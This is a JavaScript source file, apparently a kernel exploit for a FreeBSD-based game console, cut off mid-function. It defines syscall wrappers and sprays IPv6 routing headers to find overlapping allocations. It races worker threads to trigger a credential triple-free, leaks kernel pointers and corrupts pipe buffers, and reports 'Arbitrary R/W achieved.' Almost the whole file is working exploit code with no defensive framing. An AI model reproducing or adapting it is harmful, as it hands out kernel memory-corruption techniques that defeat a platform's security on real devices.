//include('userland.js')

if (!String.prototype.padStart) {
    String.prototype.padStart = function padStart(targetLength, padString) {
        targetLength = targetLength >> 0; // truncate if number or convert non-number to 0
        padString = String(typeof padString !== 'undefined' ? padString : ' ');
        if (this.length > targetLength) {
            return String(this);
        } else {
            targetLength = targetLength - this.length;
            if (targetLength > padString.length) {
                padString += padString.repeat(targetLength / padString.length); // append to original to ensure we are longer than needed
            }
            return padString.slice(0, targetLength) + String(this);
        }
    };
}

function write8 (addr, val) {
    mem.view(addr).setUint8(0, val&0xFF, true)
}

function write16 (addr, val) {
    mem.view(addr).setUint16(0, val&0xFFFF, true)
}

function write32 (addr, val) {
    mem.view(addr).setUint32(0, val&0xFFFFFFFF, true)
}

function write64 (addr, val) {
    mem.view(addr).setBigInt(0, val, true)
}

function read8 (addr) {
    return mem.view(addr).getUint8(0, true)
}

function read16 (addr) {
    return mem.view(addr).getUint16(0, true)
}

function read32 (addr) {
    return mem.view(addr).getUint32(0, true)
}

function read64 (addr) {
    return mem.view(addr).getBigInt(0, true)
}

function malloc(size) {
    return mem.malloc(size)
}

function hex(val) {
    if (val instanceof BigInt)
        return val.toString();
    return '0x' + val.toString(16).padStart(2, '0');
}

function send_notification(msg) {
    utils.notify(msg);
}

var dup                 = fn.register(0x29,  'dup',                'bigint');
var close               = fn.register(0x06,  'close',              'bigint');
var read                = fn.register(0x03,  'read',               'bigint');
var readv               = fn.register(0x78,  'readv',              'bigint');
var write               = fn.register(0x04,  'write',              'bigint');
var writev              = fn.register(0x79,  'writev',             'bigint');
var ioctl               = fn.register(0x36,  'ioctl',              'bigint');
var pipe                = fn.register(0x2A,  'pipe',               'bigint');
var kqueue              = fn.register(0x16A, 'kqueue',             'bigint');
var socket              = fn.register(0x61,  'socket',             'bigint');
var socketpair          = fn.register(0x87,  'socketpair',         'bigint');
var recvmsg             = fn.register(0x1B,  'recvmsg',            'bigint');
var getsockopt          = fn.register(0x76,  'getsockopt',         'bigint');
var setsockopt          = fn.register(0x69,  'setsockopt',         'bigint');
var setuid              = fn.register(0x17,  'setuid',             'bigint');
var getpid              = fn.register(0x14,  'getpid',             'bigint');
var sched_yield         = fn.register(0x14B, 'sched_yield',        'bigint');
var cpuset_getaffinity  = fn.register(0x1E7, 'cpuset_getaffinity', 'bigint');
var cpuset_setaffinity  = fn.register(0x1E8, 'cpuset_setaffinity', 'bigint');
var rtprio_thread       = fn.register(0x1D2, 'rtprio_thread',      'bigint');
var netcontrol          = fn.register(0x63,  'netcontrol',         'bigint');
var thr_new             = fn.register(0x1C7, 'thr_new',            'bigint');
var thr_kill            = fn.register(0x1B1, 'thr_kill',           'bigint');
var nanosleep           = fn.register(0xF0,  'nanosleep',          'bigint');
var fcntl               = fn.register(0x5C,  'fcntl',              'bigint');

// Extract syscall wrapper addresses for ROP chains from syscalls.map
var read_wrapper                = syscalls.map.get(0x03);
var write_wrapper               = syscalls.map.get(0x04);
var sched_yield_wrapper         = syscalls.map.get(0x14b);
var cpuset_setaffinity_wrapper  = syscalls.map.get(0x1e8);
var rtprio_thread_wrapper       = syscalls.map.get(0x1D2);
var recvmsg_wrapper             = syscalls.map.get(0x1B);
var readv_wrapper               = syscalls.map.get(0x78);
var writev_wrapper              = syscalls.map.get(0x79);
var thr_exit_wrapper            = syscalls.map.get(0x1af);
var thr_suspend_ucontext_wrapper = syscalls.map.get(0x278);
var setsockopt_wrapper          = syscalls.map.get(0x69);
var getsockopt_wrapper          = syscalls.map.get(0x76);

var setjmp = fn.register(libc_addr.add(0x6CA00), 'setjmp', 'bigint');
var setjmp_addr = libc_addr.add(0x6CA00);
var longjmp = fn.register(libc_addr.add(0x6CA50), 'longjmp', 'bigint');
var longjmp_addr = libc_addr.add(0x6CA50);

var BigInt_Error = new BigInt(0xFFFFFFFF,0xFFFFFFFF);

KERNEL_PID = 0;

SYSCORE_AUTHID = new BigInt(0x48000000, 0x00000007);

FIOSETOWN = 0x8004667C;

PAGE_SIZE = 0x4000;

NET_CONTROL_NETEVENT_SET_QUEUE = 0x20000003;
NET_CONTROL_NETEVENT_CLEAR_QUEUE = 0x20000007;

AF_UNIX = 1;
AF_INET6 = 28;
SOCK_STREAM = 1;
IPPROTO_IPV6 = 41;

SO_SNDBUF = 0x1001;
SOL_SOCKET = 0xffff;

IPV6_RTHDR = 51;
IPV6_RTHDR_TYPE_0 = 0;

RTP_PRIO_REALTIME = 2;
RTP_SET = 1;

UIO_READ = 0;
UIO_WRITE = 1;
UIO_SYSSPACE = 1;

CPU_LEVEL_WHICH = 3;
CPU_WHICH_TID = 1;

IOV_SIZE = 0x10;
CPU_SET_SIZE = 0x10;
PIPEBUF_SIZE = 0x18;
MSG_HDR_SIZE = 0x30;
FILEDESCENT_SIZE = 0x8;
UCRED_SIZE = 0x168;

RTHDR_TAG = 0x13370000;

UIO_IOV_NUM = 0x14;
MSG_IOV_NUM = 0x17;

IPV6_SOCK_NUM = 96;
IOV_THREAD_NUM = 8;
UIO_THREAD_NUM = 8;

MAX_ROUNDS_TWIN = 10;
MAX_ROUNDS_TRIPLET = 200;

COMMAND_UIO_READ = 0;
COMMAND_UIO_WRITE = 1;

MAIN_CORE = 7;
MAIN_RTPRIO = 0x100;

RTP_LOOKUP = 0;
RTP_SET = 1;
PRI_REALTIME = 2;

F_SETFL = 4;
O_NONBLOCK = 4;


/***************************/
/*      Used variables     */
/************************* */

var twins = new Array(2);
var triplets = new Array(3);
var ipv6_socks = new Array(IPV6_SOCK_NUM);

var spray_rthdr = malloc(UCRED_SIZE);
var spray_rthdr_len;
var leak_rthdr = malloc(UCRED_SIZE);
var leak_rthdrLen;

// Allocate buffer for ipv6_sockets magic spray
var spray_rthdr_rop = malloc(IPV6_SOCK_NUM * UCRED_SIZE);
// Allocate buffer array for all socket data (X sockets × 8 bytes each)
var read_rthdr_rop = malloc(IPV6_SOCK_NUM * 8);
var check_len = malloc(4);
// Initialize check_len to 8 bytes (done in JavaScript before ROP runs)


var fdt_ofiles;
var masterRpipeFile;
var victimRpipeFile;
var masterRpipeData;
var victimRpipeData;

// Corrupt pipebuf of masterRpipeFd.
    masterPipebuf = malloc(PIPEBUF_SIZE);


write32(check_len, 8);

var msg         = malloc(MSG_HDR_SIZE);
var msgIov      = malloc(MSG_IOV_NUM * IOV_SIZE);
var uioIovRead  = malloc(UIO_IOV_NUM * IOV_SIZE);
var uioIovWrite = malloc(UIO_IOV_NUM * IOV_SIZE);

var uio_sock = malloc(8);
var iov_sock = malloc(8);

var iov_thread_ready = malloc(8*IOV_THREAD_NUM);
var iov_thread_done = malloc(8*IOV_THREAD_NUM);
var iov_signal_buf = malloc(8*IOV_THREAD_NUM);

var uio_readv_thread_ready = malloc(8*UIO_THREAD_NUM);
var uio_readv_thread_done = malloc(8*UIO_THREAD_NUM);
var uio_readv_signal_buf = malloc(8*IOV_THREAD_NUM);

var uio_writev_thread_ready = malloc(8*UIO_THREAD_NUM);
var uio_writev_thread_done = malloc(8*UIO_THREAD_NUM);
var uio_writev_signal_buf = malloc(8*IOV_THREAD_NUM);

var spray_ipv6_ready = malloc(8);
var spray_ipv6_done = malloc(8);
var spray_ipv6_signal_buf = malloc(8);
var spray_ipv6_stack = malloc(0x2000);
var spray_ipv6_triplet_stack = malloc(0x2000);

var iov_recvmsg_workers = [];
var uio_readv_workers = [];
var uio_writev_workers = [];
var spray_ipv6_worker;

var uaf_socket;

var uio_sock_0;
var uio_sock_1;

var iov_sock_0;
var iov_sock_1;

var pipe_sock = malloc(8);
var master_pipe = []
var victim_pipe = []

var masterRpipeFd
var masterWpipeFd
var victimRpipeFd
var victimWpipeFd

var kq_fdp;
var kq_lock;
var fdt_ofiles;
var allproc;

var tmp = malloc(PAGE_SIZE);

var saved_fpu_ctrl = 0;
var saved_mxcsr = 0;

function build_rthdr(buf, size) {
    const len = ((Number(size) >> 3) - 1) & ~1;
    const actual_size = (len + 1) << 3;
        write8(buf.add(0x00), 0);                   // ip6r_nxt
        write8(buf.add(0x01), len);                 // ip6r_len
        write8(buf.add(0x02), IPV6_RTHDR_TYPE_0);   // ip6r_type
        write8(buf.add(0x03), (len >> 1));          // ip6r_segleft
    return actual_size;
}

function set_sockopt(sd, level, optname, optval, optlen) {
    const result = setsockopt(sd, level, optname, optval, optlen);
    if (result.eq(BigInt_Error)) {
        throw new Error("set_sockopt error: " + hex(result));
        //debug("set_sockopt error: " + hex(result));
    }
    return result;
}

// Global buffer to minimize footprint
const sockopt_len_ptr = malloc(4);

function get_sockopt(sd, level, optname, optval, optlen) {
    //const len_ptr = malloc(4);
    write32(sockopt_len_ptr, optlen);
    const result = getsockopt(sd, level, optname, optval, sockopt_len_ptr);
    //debug("get_sockopt with sd: " + hex(sd) + " result: " + hex(result));
    if (result.eq(BigInt_Error)) {
        throw new Error("get_sockopt error: " + hex(result));
        //debug("get_sockopt error: " + hex(result));
    }
    return read32(sockopt_len_ptr);
}

function set_rthdr(sd, buf, len) {
    return set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
    //debug("set_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
    //debug("Called with buf: " + hex(read64(buf)) + " len: " + hex(len));
    //return ret;
}

function get_rthdr(sd, buf, max_len) {
    return get_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, buf, max_len);
    //debug("get_sockopt with sd: " + hex(sd) + " ret: " + hex(ret));
    //debug("Result buf: " + hex(read64(buf)) + " max_len: " + hex(max_len));
    //return ret;
}

function free_rthdrs(sds) {
    for (var i = 0; i < sds.length; i++) {
        if (!sds[i].eq(BigInt_Error)) {
            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
        }
    }
}

function free_rthdr(sd) {
    set_sockopt(sd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
}

function pin_to_core(core) {
    const mask = malloc(0x10);
    write32(mask, 1 << core);
    cpuset_setaffinity(3, 1, BigInt_Error, 0x10, mask);
}

function get_core_index(mask_addr) {
    var num = Number(read32(mask_addr));
    var position = 0;
    while (num > 0) {
        num = num >>> 1;
        position++;
    }
    return position - 1;
}

function get_current_core() {
    const mask = malloc(0x10);
    cpuset_getaffinity(3, 1, BigInt_Error, 0x10, mask);
    return get_core_index(mask);
}

function set_rtprio(prio) {
    const rtprio = malloc(0x4);
    write16(rtprio, PRI_REALTIME);
    write16(rtprio.add(2), prio);
    rtprio_thread(RTP_SET, 0, rtprio);
}

function get_rtprio() {
    const rtprio = malloc(0x4);
    write16(rtprio, PRI_REALTIME);
    write16(rtprio.add(2), 0);
    rtprio_thread(RTP_LOOKUP, 0, rtprio);
    return Number(read16(rtprio.add(2)));
}

function create_workers() {
    var sock_buf = malloc(8);

    // Create workers
    for(var i=0; i<IOV_THREAD_NUM; i++) {
        var worker = {};
        var pipe_0;
        var pipe_1;
        var ready = iov_thread_ready.add(8*i);
        var done = iov_thread_done.add(8*i);
        var signal_buf = iov_signal_buf.add(8*i);

        // Socket pair to signal "run"
        socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
        pipe_0 = read32(sock_buf);
        pipe_1 = read32(sock_buf.add(4));
        //debug("create pipe: " + pipe_0 + " " + pipe_1);

        var ret = iov_recvmsg_worker_rop(ready, pipe_0, done, signal_buf);

        worker.rop = ret.rop;
        worker.loop_size = ret.loop_size;
        worker.pipe_0 = pipe_0;
        worker.pipe_1 = pipe_1;
        worker.ready = ready;
        worker.done = done;
        worker.signal_buf = signal_buf;
        iov_recvmsg_workers[i] = worker;
    }

    for(var i=0; i<UIO_THREAD_NUM; i++) {
        var worker = {};
        var pipe_0;
        var pipe_1;
        var ready = uio_readv_thread_ready.add(8*i);
        var done = uio_readv_thread_done.add(8*i);
        var signal_buf = uio_readv_signal_buf.add(8*i);

        // Socket pair to signal "run"
        socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
        pipe_0 = read32(sock_buf);
        pipe_1 = read32(sock_buf.add(4));
        //debug("create pipe: " + pipe_0 + " " + pipe_1);

        var ret = uio_readv_worker_rop(ready, pipe_0, done, signal_buf);

        worker.rop = ret.rop;
        worker.loop_size = ret.loop_size;
        worker.pipe_0 = pipe_0;
        worker.pipe_1 = pipe_1;
        worker.ready = ready;
        worker.done = done;
        worker.signal_buf = signal_buf;
        uio_readv_workers[i] = worker;
    }

    for(var i=0; i<UIO_THREAD_NUM; i++) {
        var worker = {};
        var pipe_0;
        var pipe_1;
        var ready = uio_writev_thread_ready.add(8*i);
        var done = uio_writev_thread_done.add(8*i);
        var signal_buf = uio_writev_signal_buf.add(8*i);

        // Socket pair to signal "run"
        socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
        pipe_0 = read32(sock_buf);
        pipe_1 = read32(sock_buf.add(4));
        //debug("create pipe: " + pipe_0 + " " + pipe_1);

        var ret = uio_writev_worker_rop(ready, pipe_0, done, signal_buf);

        worker.rop = ret.rop;
        worker.loop_size = ret.loop_size;
        worker.pipe_0 = pipe_0;
        worker.pipe_1 = pipe_1;
        worker.ready = ready;
        worker.done = done;
        worker.signal_buf = signal_buf;
        uio_writev_workers[i] = worker;
    }

    // Create worker for spray and read magic in ipv6_sockets
    var worker = {};
    var pipe_0;
    var pipe_1;
    var ready = spray_ipv6_ready;
    var done = spray_ipv6_done;
    var signal_buf = spray_ipv6_signal_buf;

    // Socket pair to signal "run"
    socketpair(AF_UNIX, SOCK_STREAM, 0, sock_buf);
    pipe_0 = read32(sock_buf);
    pipe_1 = read32(sock_buf.add(4));

    var ret = ipv6_sock_spray_and_read_rop(ready, pipe_0, done, signal_buf);

    worker.rop = ret.rop;
    worker.loop_size = ret.loop_size;
    worker.pipe_0 = pipe_0;
    worker.pipe_1 = pipe_1;
    worker.ready = ready;
    worker.done = done;
    worker.signal_buf = signal_buf;

    spray_ipv6_worker = worker;         // --> Worker data
}

function init_workers() {
    init_threading(); // save needed info for longjmp

    var worker;
    var ret;

    for(var i=0; i<IOV_THREAD_NUM; i++) {
        worker = iov_recvmsg_workers[i];
        ret = spawn_thread(worker.rop, worker.loop_size); 
        if (ret.eq(BigInt_Error)) {
            throw new Error("Could not spawn iov_recvmsg_workers[" + i + "]");
        }
        var thread_id = ret & 0xFFFFFFFF;               // Convert to 32bits value
        iov_recvmsg_workers[i].thread_id = thread_id;   // Save thread ID
    }

    for(var i=0; i<UIO_THREAD_NUM; i++) {
        worker = uio_readv_workers[i];
        ret = spawn_thread(worker.rop, worker.loop_size); 
        if (ret.eq(BigInt_Error)) {
            throw new Error("Could not spawn uio_readv_workers[" + i + "]");
        }
        var thread_id = ret & 0xFFFFFFFF;               // Convert to 32bits value
        uio_readv_workers[i].thread_id = thread_id;     // Save thread ID
    }

    for(var i=0; i<UIO_THREAD_NUM; i++) {
        worker = uio_writev_workers[i];
        ret = spawn_thread(worker.rop, worker.loop_size); 
        if (ret.eq(BigInt_Error)) {
            throw new Error("Could not spawn uio_writev_workers[" + i + "]");
        }
        var thread_id = ret & 0xFFFFFFFF;               // Convert to 32bits value
        uio_writev_workers[i].thread_id = thread_id;    // Save thread ID
    }
}

function nanosleep_fun(nsec) {
    const timespec = malloc(0x10);
    write64(timespec, Math.floor(nsec / 1e9));    // tv_sec
    write64(timespec.add(8), nsec % 1e9);         // tv_nsec
    nanosleep(timespec);
}

function wait_for(addr, threshold) {
    while (!read64(addr).eq(threshold)) {
        nanosleep_fun(1);
    }
}

function trigger_iov_recvmsg() {
    
    // Clear done signals
    for(var i=0; i<IOV_THREAD_NUM; i++) {
        worker = iov_recvmsg_workers[i];
        write64(worker.done, 0);
        //debug("Worker done: " + hex(read64(worker.done)) );
    }

    // Send Init signal
    for(var i=0; i<IOV_THREAD_NUM; i++) {
        worker = iov_recvmsg_workers[i];
        ret = write(worker.pipe_1, worker.signal_buf, 1); 
        if (ret.eq(BigInt_Error)) {
            throw new Error("Could not signal 'run' iov_recvmsg_workers[" + i + "]");
        }
    }
}

function wait_iov_recvmsg() {
    // Wait for completition
    for(var i=0; i<IOV_THREAD_NUM; i++) {
        worker = iov_recvmsg_workers[i];
        wait_for(worker.done, 1)
        //debug("Worker done: " + hex(read64(worker.done)) );
    }

    //debug("iov_recvmsg workers run OK");
}

function trigger_ipv6_spray_and_read() {
    
    // Worker information is already loaded

    // Clear done signals
    write64(spray_ipv6_worker.done, 0);

    // Spawn ipv6_sockets spray and read worker
    // Passing an stack addr reserved for each iteration
    ret = spawn_thread(spray_ipv6_worker.rop, spray_ipv6_worker.loop_size, spray_ipv6_stack); 
    if (ret.eq(BigInt_Error)) {
        throw new Error("Could not spray_ipv6_worker");
    }
    var thread_id = ret & 0xFFFFFFFF;               // Convert to 32bits value
    spray_ipv6_worker.thread_id = thread_id;        // Save thread ID

    // Send Init signal
    ret = write(spray_ipv6_worker.pipe_1, spray_ipv6_worker.signal_buf, 1); 
    if (ret.eq(BigInt_Error)) {
        throw new Error("Could not signal 'run' spray_ipv6_worker");
    }
}

function wait_ipv6_spray_and_read() {
    // Wait for completition
    wait_for(spray_ipv6_worker.done, 1)
}

function trigger_uio_readv() {
    
    // Clear done signals
    for(var i=0; i<UIO_THREAD_NUM; i++) {
        worker = uio_readv_workers[i];
        write64(worker.done, 0);
        //debug("trigger_uio_readv done: " + hex(read64(worker.done)) );
    }

    // Send Init signal
    for(var i=0; i<UIO_THREAD_NUM; i++) {
        worker = uio_readv_workers[i];
        ret = write(worker.pipe_1, worker.signal_buf, 1); 
        if (ret.eq(BigInt_Error)) {
            throw new Error("Could not signal 'run' iov_recvmsg_workers[" + i + "]");
        }
    }
}

function wait_uio_readv() {
    // Wait for completition
    for(var i=0; i<UIO_THREAD_NUM; i++) {
        worker = uio_readv_workers[i];
        wait_for(worker.done, 1);
    }
    //debug("Exit wait_uio_readv()");
}

function trigger_uio_writev() {
    
    // Clear done signals
    for(var i=0; i<UIO_THREAD_NUM; i++) {
        worker = uio_writev_workers[i];
        write64(worker.done, 0);
        //debug("trigger_uio_writev done: " + hex(read64(worker.done)) );
    }

    // Send Init signal
    for(var i=0; i<UIO_THREAD_NUM; i++) {
        worker = uio_writev_workers[i];
        ret = write(worker.pipe_1, worker.signal_buf, 1); 
        if (ret.eq(BigInt_Error)) {
            throw new Error("Could not signal 'run' iov_recvmsg_workers[" + i + "]");
        }
    }
}

function wait_uio_writev() {
    // Wait for completition
    for(var i=0; i<UIO_THREAD_NUM; i++) {
        worker = uio_writev_workers[i];
        wait_for(worker.done, 1);
    }
    //debug("Exit wait_uio_writev()");
}

function setup() {
    debug("Preparing netctrl...");
    // Prepare spray buffer.
    spray_rthdr_len = build_rthdr(spray_rthdr, UCRED_SIZE);
    //debug("this is spray_rthdr_len: " + hex(spray_rthdr_len));

    // Fill spray_rthdr_rop for ipv6_sockets spray
    for(i=0; i<IPV6_SOCK_NUM; i++) {
        build_rthdr(spray_rthdr_rop.add(i*UCRED_SIZE), UCRED_SIZE);
        // Prefill with tagged information
        write32(spray_rthdr_rop.add(i*UCRED_SIZE+0x04), RTHDR_TAG | i);
    }

    // Prepare msg iov buffer.
    write64(msg.add(0x10), msgIov);      // msg_iov
    write64(msg.add(0x18), MSG_IOV_NUM); // msg_iovlen

    dummyBuffer = malloc(0x1000);
    fill_buffer_64(dummyBuffer, new BigInt(0x41414141, 0x41414141), 0x1000);

    write64(uioIovRead.add(0x00), dummyBuffer);
    write64(uioIovWrite.add(0x00), dummyBuffer);

    // Create socket pair for uio spraying.
    socketpair(AF_UNIX, SOCK_STREAM, 0, uio_sock);
    uio_sock_0 = read32(uio_sock);
    uio_sock_1 = read32(uio_sock.add(4));

    // Create socket pair for iov spraying.
    socketpair(AF_UNIX, SOCK_STREAM, 0, iov_sock);
    iov_sock_0 = read32(iov_sock);
    iov_sock_1 = read32(iov_sock.add(4));

    // Set up sockets for spraying.
    for (var i = 0; i < ipv6_socks.length; i++) {
      ipv6_socks[i] = socket(AF_INET6, SOCK_STREAM, 0);
    }

    // Initialize pktopts.
    free_rthdrs(ipv6_socks);

    // Create pipes for arbitrary kernel r/w
    pipe(pipe_sock);
    master_pipe[0] = read32(pipe_sock);
    master_pipe[1] = read32(pipe_sock.add(4));

    pipe(pipe_sock);
    victim_pipe[0] = read32(pipe_sock);
    victim_pipe[1] = read32(pipe_sock.add(4));

    masterRpipeFd = master_pipe[0]
    masterWpipeFd = master_pipe[1]
    victimRpipeFd = victim_pipe[0]
    victimWpipeFd = victim_pipe[1]

    fcntl(masterRpipeFd, F_SETFL, O_NONBLOCK);
    fcntl(masterWpipeFd, F_SETFL, O_NONBLOCK);
    fcntl(victimRpipeFd, F_SETFL, O_NONBLOCK);
    fcntl(victimWpipeFd, F_SETFL, O_NONBLOCK);

    // Create and Init Thread Workers
    create_workers();

    init_workers();

    debug("Spawned workers iov[" + IOV_THREAD_NUM + "] uio_readv[" + UIO_THREAD_NUM + "] uio_writev[" + UIO_THREAD_NUM + "]");

}

function cleanup() {

    var worker;

    debug("Cleaning up...");

    // Close all files.
    for (var i = 0; i < ipv6_socks.length; i++) {
        close(ipv6_socks[i]);
    }

    close(uio_sock_1);
    close(uio_sock_0);
    close(iov_sock_1);
    close(iov_sock_0);

    for(var i=0; i<IOV_THREAD_NUM; i++) {
        worker = iov_recvmsg_workers[i];
        if (worker !== undefined) {
            if (worker.thread_id !== undefined) {
                //thr_kill(worker.thread_id, 9); // SIGKILL
            }
            close(worker.pipe_0);
            close(worker.pipe_1);
        }
    }

    for(var i=0; i<UIO_THREAD_NUM; i++) {
        worker = uio_readv_workers[i];
        if (worker !== undefined) {
            if (worker.thread_id !== undefined) {
                //thr_kill(worker.thread_id, 9); // SIGKILL
            }
            close(worker.pipe_0);
            close(worker.pipe_1);
        }
    }

    for(var i=0; i<UIO_THREAD_NUM; i++) {
        worker = uio_writev_workers[i];
        if (worker !== undefined) {
            if (worker.thread_id !== undefined) {
                //thr_kill(worker.thread_id, 9); // SIGKILL
            }
            close(worker.pipe_0);
            close(worker.pipe_1);
        }
    }

    if (spray_ipv6_worker !== undefined) {
        close(spray_ipv6_worker.pipe_0);
        close(spray_ipv6_worker.pipe_1);
    }

    if (prev_core >= 0) {
        debug("Restoring to previous core: " + prev_core);
        pin_to_core(prev_core);
        prev_core = -1;
    }
    
    set_rtprio(prev_rtprio);

    debug("Cleanup completed");

    thr_kill(iov_recvmsg_workers[1].thread_id, 9); // SIGKILL
}



function fill_buffer_64(buf, val, len) {
    for (i = 0; i < len; i=i+8) {
        write64(buf.add(i), val);
    }
}

function find_twins_rop() {
   var count = 0;
   var val;
   var i;
   var j;

    while (count < MAX_ROUNDS_TWIN) {
        if (count % 10 == 0) {
            //debug("find_twins_rop iteration: " + count);
        }

        // Trigger worker to fill ipv6 sockets
        trigger_ipv6_spray_and_read();
        // Wait completition
        wait_ipv6_spray_and_read();

        for (i = 0; i < IPV6_SOCK_NUM; i++) {
            val = read32(read_rthdr_rop.add(i*8+4));
            //debug("Read val: " + hex(val) + " from add " + hex(read_rthdr_rop.add(i*8)));
            j = val & 0xFFFF;
            // I got 'i' socket routing header but find 'j' value
            if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
                twins[0] = i;
                twins[1] = j;
                debug("[*] Twins found: [" + i + "] [" + j + "]");
                return true;
            }
        }
        count++;
    }
    debug("find_twins_rop failed");
    return false;
    //cleanup();
    //throw new Error("find_twins failed");
}

function find_twins() {
    var count = 0;
    var val
    var i;
    var j;

    // Minimizing the usage of BigInt class
    const spray_add = spray_rthdr.add(0x04);
    const lead_add = leak_rthdr.add(0x04);

    while (count < MAX_ROUNDS_TWIN) {
        if (count % 10 == 0) {
            //debug("find_twins iteration: " + count);
        }
        for (i = 0; i < ipv6_socks.length; i++) {
            write32(spray_add, RTHDR_TAG | i);
            set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
            
            //Using pre-filled buffer to spray
            //set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
            //setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
        }
        for (i = 0; i < ipv6_socks.length; i++) {
            get_rthdr(ipv6_socks[i], leak_rthdr, 8);
            val = read32(lead_add);
            j = val & 0xFFFF;
            // I got 'i' socket routing header but find 'j' value
            if ((val & 0xFFFF0000) === RTHDR_TAG && i !== j) {
                twins[0] = i;
                twins[1] = j;
                debug("[*] Twins found: [" + i + "] [" + j + "]");
                return true;
            }
        }
        count++;
    }
    debug("find_twins failed");
    return false;
    //cleanup();
    //throw new Error("find_twins failed");
}

function find_triplet(master, other, iterations) {
    //debug("Enter find_triplet (" + master + ") (" + other + ")" );
    
    if(typeof iterations === 'undefined') {
        iterations = MAX_ROUNDS_TRIPLET;
    }

    var count = 0;
    var val;
    var i;
    var j;

    // Minimizing the usage of BigInt class
    const spray_add = spray_rthdr.add(0x04);
    const leak_add = leak_rthdr.add(0x04);

    while (count < iterations) {
        if (count % 100 == 0) {
            //debug("find_triplet iteration: " + count);
        }
        for (i = 0; i < ipv6_socks.length; i++) {
            if (i === master || i === other) {
                continue;
            }

            write32(spray_add, RTHDR_TAG | i);
            set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);

            //Using pre-filled buffer to spray
            //set_rthdr(ipv6_socks[i], spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
            //setsockopt(ipv6_socks[i], IPPROTO_IPV6, IPV6_RTHDR, spray_rthdr_rop.add(i*UCRED_SIZE), spray_rthdr_len);
        }

        //for (i = 0; i < ipv6_socks.length; i++) {
        //    if (i === master || i === other) {
        //        continue;
        //    }
        get_rthdr(ipv6_socks[master], leak_rthdr, 8);
        val = read32(leak_add);
        j = val & 0xFFFF;
        if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
            debug("Triplet found: [" + j + "] at iteration " + count);
            return j;
        }
        //}
        count++;
    }
    return -1;
    //cleanup();
    //throw new Error("find_triplet failed");
}



function init_threading() {
    const jmpbuf = malloc(0x60);
    setjmp(jmpbuf);
    saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
    saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
}   


function netctrl_exploit() {

    prev_core = get_current_core();
    prev_rtprio = get_rtprio();
    pin_to_core(MAIN_CORE);
    set_rtprio(MAIN_RTPRIO);
    debug("  Previous core " + prev_core + " Pinned to core " + MAIN_CORE);

    setup();

    var end = false;

    while(!end) {
        // Trigger vulnerability.
        trigger_ucred_triplefree();

        // Leak pointers from kqueue.
        end = leak_kqueue();
    }

    // Leak fd_files from kq_fdp.
    const fd_files = kreadslow64(kq_fdp);
    fdt_ofiles = fd_files.add(0x08);
    debug("fdt_ofiles: " + hex(fdt_ofiles));

    masterRpipeFile = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
    debug("masterRpipeFile: " + hex(masterRpipeFile));

    victimRpipeFile = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE));
    debug("victimRpipeFile: " + hex(victimRpipeFile));

    masterRpipeData = kreadslow64(masterRpipeFile.add(0x00));
    debug("masterRpipeData: " + hex(masterRpipeData));

    victimRpipeData = kreadslow64(victimRpipeFile.add(0x00));
    debug("victimRpipeData: " + hex(victimRpipeData));

    // Corrupt pipebuf of masterRpipeFd.
    masterPipebuf = malloc(PIPEBUF_SIZE);
    write32(masterPipebuf.add(0x00), 0);                // cnt
    write32(masterPipebuf.add(0x04), 0);                // in
    write32(masterPipebuf.add(0x08), 0);                // out
    write32(masterPipebuf.add(0x0C), PAGE_SIZE);        // size
    write64(masterPipebuf.add(0x10), victimRpipeData);  // buffer

    kwriteslow(masterRpipeData, masterPipebuf, PIPEBUF_SIZE);

    // Increase reference counts for the pipes.
    fhold(fget(master_pipe[0]));
    fhold(fget(master_pipe[1]));
    fhold(fget(victim_pipe[0]));
    fhold(fget(victim_pipe[1]));

    for(var i=0; i<0x20; i=i+8) {
        var read = kread64(masterRpipeData.add(i));
        debug("Reading masterRpipeData[" + i + "] : " + hex(read) );
    }

    debug("[+] Arbitrary R/W achieved.");

    //fhold(fget(master_pipe[0]));
    //fhold(fget(master_pipe[1]));
    //fhold(fget(victim_pipe[0]));
    //fhold(fget(victim_pipe[1]));

    //for (i=0; i < triplets.length; i++) {
    //    removeRthrFromSocket(ipv6_socks[triplets[i]]);
    //}

    //removeUafFile();

}

function fhold(fp) {
    kwrite32(fp.add(0x28), kread32(fp.add(0x28)) + 1); // f_count
}

function fget(fd) {
    return kread64(fdt_ofiles.add(fd * FILEDESCENT_SIZE));
}

function removeRthrFromSocket(fd) {
    fp = fget(fd);
    f_data = kread64(fp.add(0x00));
    so_pcb = kread64(f_data.add(0x18));
    in6p_outputopts = kread64(so_pcb.add(0x118));
    kwrite64(in6p_outputopts.add(0x68), 0); // ip6po_rhi_rthdr
}


const victimPipebuf = malloc(PIPEBUF_SIZE);

function corruptPipebuf(cnt, _in, out, size, buffer) {
    if (buffer.eq(0)) {
        throw new Error("buffer cannot be zero");
    }
    write32(victimPipebuf.add(0x00), cnt);      // cnt
    write32(victimPipebuf.add(0x04), _in);       // in
    write32(victimPipebuf.add(0x08), out);      // out
    write32(victimPipebuf.add(0x0C), size);     // size
    write64(victimPipebuf.add(0x10), buffer);   // buffer
    write(masterWpipeFd, victimPipebuf, PIPEBUF_SIZE);

    // Debug
    read(masterRpipeFd, victimPipebuf, PIPEBUF_SIZE);
    for (i=0; i<PIPEBUF_SIZE; i=i+8) {
        debug("corrupt_read: " + hex(read64(victimPipebuf.add(i))) );
    }

    return //read(masterRpipeFd, victimPipebuf, PIPEBUF_SIZE);
}

function kwrite(dest, src, n) {
